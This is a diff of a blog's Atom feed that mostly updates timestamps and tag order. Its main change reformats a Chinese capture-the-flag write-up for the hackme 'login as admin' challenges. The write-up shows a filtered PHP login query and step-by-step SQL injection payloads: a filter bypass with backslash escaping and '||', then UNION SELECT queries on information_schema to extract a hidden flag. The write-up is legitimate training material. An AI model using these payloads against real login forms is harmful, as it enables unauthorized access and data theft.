@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-10-12T01:22:15.794Z</updated>
+  <updated>2019-10-12T02:34:35.531Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://yoursite.com/2019/10/12/loginasadmin/"/>
     <id>http://yoursite.com/2019/10/12/loginasadmin/</id>
     <published>2019-10-12T00:43:12.000Z</published>
-    <updated>2019-10-12T01:22:15.794Z</updated>
+    <updated>2019-10-12T02:34:35.531Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="src-hackme-loginasadmin-系列"><a href="#src-hackme-loginasadmin-系列" class="headerlink" title="[src = hackme] loginasadmin 系列"></a>[src = hackme] loginasadmin 系列</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>login as admin 0： SQL Injection!<br>login as admin 0.1：  Grab the hidden flag<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>SQL注入。题目还提供了源码，所以查看，发现进行了一些过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);  <span class="comment">//转换为小写，然后随后的if语句过滤了部分注入常用的关键词，如'or 1=1'</span></span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str); <span class="comment">//将单引号替换为\\'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题的关键就是绕过这些过滤。一般情况我们可以通过输入<br>admin’ or 1=1# 来进行注入(密码部分任意填写，因为#注释掉后面的查询条件)，因为sql语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>此时如果没有过滤，查询变为：<br>SELECT * FROM <code>user</code> WHERE <code>user</code> = ‘admin’ or 1=1#’ AND <code>password</code> = ‘%s’</p><p>可以注入，但是现在过滤后，or 1=1不能使用，这个可以通过||绕过，所以改为<br>admin’ || 1=1#<br>其中的’被取代为\‘，所以查询变为：SELECT * FROM <code>user</code> WHERE <code>user</code> = ‘admin&#39; or 1=1#’ AND <code>password</code> = ‘%s’<br>语法错误，可以通过在admin后再加一个\进行转义，将\‘中的第一个\转义,即admin&#39; || 1=1#。<br>则查询语句变为：<br>SELECT * FROM <code>user</code> WHERE <code>user</code> = ‘admin&#39; or 1=1#’ AND <code>password</code> = ‘%s’<br>可以进行注入，结果如图：</p><p><img src="./loginasadmin0.PNG" alt="login0"></p><p>说明登录的不是管理员账号，从源代码的注释可以看到一下信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// table schema</span></span><br><span class="line"><span class="comment">// user -&gt; id, user, password, is_admin</span></span><br></pre></td></tr></table></figure><p>所以表中有一列为is_admin确定了是否为管理员，我们拿到的数据库的第一行返回的用户并不是管理员，所以我们需要查看返回的其他行，通过limit 1,1来限制。我们去第2个输出。</p><p>注入语句变为：admin&#39; || 1=1 limit 1,1#。再进行注入得到flag：<br><img src="./loginasadmin1.PNG" alt="login0"></p><p>同时提示flag2在数据库中，所以需要通过SQLi来获取数据库里面隐藏的其他flag。其实第一个flag的值已经提示了需要使用UNION查询：</p><p>我们先来测试页面显示的是查询结果的第几列：<br>注入语句为：admin&#39; union select 1,2,3,4#<br>返回页面如下：<br><img src="./loginasadmin2.PNG" alt="login0"><br>2被回显，说明回显的是第2列，我们就利用2的位置显示我们需要的数据，我们演示全部过程：</p><ol><li>查数据库名字：<br>&#39; union select 1,database(),3,4#<br>得到数据库名字为：login_as_admin0</li><li>查询表名：<br>&#39; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=”login_as_admin0”),3,4#<br>得到有两个表：h1dden_f14g,user<br>可以看出隐藏的flag应该在h1dden_f14g表中。</li><li>查询表的列名：<br>&#39; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=”h1dden_f14g”),3,4#<br>得到就只有1列：<br>the_f14g</li><li>查询该列的具体内容：<br>&#39; union select 1,(select the_f14g from login_as_admin0.h1dden_f14g),3,4#<br>得到flag：</li></ol><p><img src="./loginasadmin3.PNG" alt="login0"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>典型的SQLi注入流程，堪称教学式SQLi。</p>]]></content>
+    <content type="html"><![CDATA[<h2 id="src-hackme-loginasadmin-系列"><a href="#src-hackme-loginasadmin-系列" class="headerlink" title="[src = hackme] loginasadmin 系列"></a>[src = hackme] loginasadmin 系列</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>login as admin 0： SQL Injection!<br>login as admin 0.1：  Grab the hidden flag<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>SQL注入。题目还提供了源码，所以查看，发现进行了一些过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);  <span class="comment">//转换为小写，然后随后的if语句过滤了部分注入常用的关键词，如'or 1=1'</span></span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str); <span class="comment">//将单引号替换为\\'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题的关键就是绕过这些过滤。一般情况我们可以通过输入<br>admin’ or 1=1# 来进行注入(密码部分任意填写，因为#注释掉后面的查询条件)，因为sql语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>此时如果没有过滤，查询变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `user` WHERE `user` = <span class="string">'admin'</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#' AND `password` = '%s'</span></span><br></pre></td></tr></table></figure><p>可以注入，但是现在过滤后，or 1=1不能使用，这个可以通过||绕过，所以改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">' || 1=1#</span></span><br></pre></td></tr></table></figure><p>其中的’被取代为“\\&#39;”，所以查询变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `user` WHERE `user` = <span class="string">'admin\' or 1=1#'</span> <span class="keyword">AND</span> `password` = <span class="string">'%s'</span></span><br></pre></td></tr></table></figure><p>语法错误，可以通过在admin后再加一个\进行转义，将\\‘中的第一个\转义,即</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\<span class="string">' || 1=1#。</span></span><br></pre></td></tr></table></figure><p>则查询语句变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `user` WHERE `user` = <span class="string">'admin\\'</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#' AND `password` = '%s'</span></span><br></pre></td></tr></table></figure><p>可以进行注入，结果如图：</p><p><img src="./loginasadmin0.PNG" alt="login0"></p><p>说明登录的不是管理员账号，从源代码的注释可以看到一下信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// table schema</span></span><br><span class="line"><span class="comment">// user -&gt; id, user, password, is_admin</span></span><br></pre></td></tr></table></figure><p>所以表中有一列为is_admin确定了是否为管理员，我们拿到的数据库的第一行返回的用户并不是管理员，所以我们需要查看返回的其他行，通过limit 1,1来限制。我们去第2个输出。</p><p>注入语句变为：admin\‘ || 1=1 limit 1,1#。再进行注入得到flag：<br><img src="./loginasadmin1.PNG" alt="login0"></p><p>同时提示flag2在数据库中，所以需要通过SQLi来获取数据库里面隐藏的其他flag。其实第一个flag的值已经提示了需要使用UNION查询：</p><p>我们先来测试页面显示的是查询结果的第几列：<br>注入语句为：admin\‘ union select 1,2,3,4#<br>返回页面如下：<br><img src="./loginasadmin2.PNG" alt="login0"><br>2被回显，说明回显的是第2列，我们就利用2的位置显示我们需要的数据，我们演示全部过程：</p><ol><li>查数据库名字：<br>\‘ union select 1,database(),3,4#<br>得到数据库名字为：login_as_admin0</li><li>查询表名：<br>\‘ union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=”login_as_admin0”),3,4#<br>得到有两个表：h1dden_f14g,user<br>可以看出隐藏的flag应该在h1dden_f14g表中。</li><li>查询表的列名：<br>\‘ union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=”h1dden_f14g”),3,4#<br>得到就只有1列：<br>the_f14g</li><li>查询该列的具体内容：<br>\‘ union select 1,(select the_f14g from login_as_admin0.h1dden_f14g),3,4#<br>得到flag：</li></ol><p><img src="./loginasadmin3.PNG" alt="login0"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>典型的SQLi注入流程，堪称教学式SQLi。</p>]]></content>
     
     <summary type="html">
     
@@ -83,9 +83,9 @@
       <category term="RE" scheme="http://yoursite.com/categories/RE/"/>
     
     
-      <category term="python" scheme="http://yoursite.com/tags/python/"/>
-    
       <category term="IDA" scheme="http://yoursite.com/tags/IDA/"/>
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
     
       <category term="RE" scheme="http://yoursite.com/tags/RE/"/>
     
@@ -110,9 +110,9 @@
       <category term="RE" scheme="http://yoursite.com/categories/RE/"/>
     
     
-      <category term="python" scheme="http://yoursite.com/tags/python/"/>
-    
       <category term="IDA" scheme="http://yoursite.com/tags/IDA/"/>
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
     
       <category term="RE" scheme="http://yoursite.com/tags/RE/"/>
     
@@ -218,13 +218,13 @@
       <category term="RE" scheme="http://yoursite.com/categories/RE/"/>
     
     
-      <category term="python" scheme="http://yoursite.com/tags/python/"/>
-    
       <category term="逆向工程" scheme="http://yoursite.com/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
     
       <category term="IDA" scheme="http://yoursite.com/tags/IDA/"/>
     
       <category term="Binary" scheme="http://yoursite.com/tags/Binary/"/>
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
     
   </entry>
   
@@ -366,9 +366,9 @@
       <category term="CRYPTO" scheme="http://yoursite.com/categories/CRYPTO/"/>
     
     
-      <category term="AES" scheme="http://yoursite.com/tags/AES/"/>
-    
       <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+      <category term="AES" scheme="http://yoursite.com/tags/AES/"/>
     
   </entry>
   
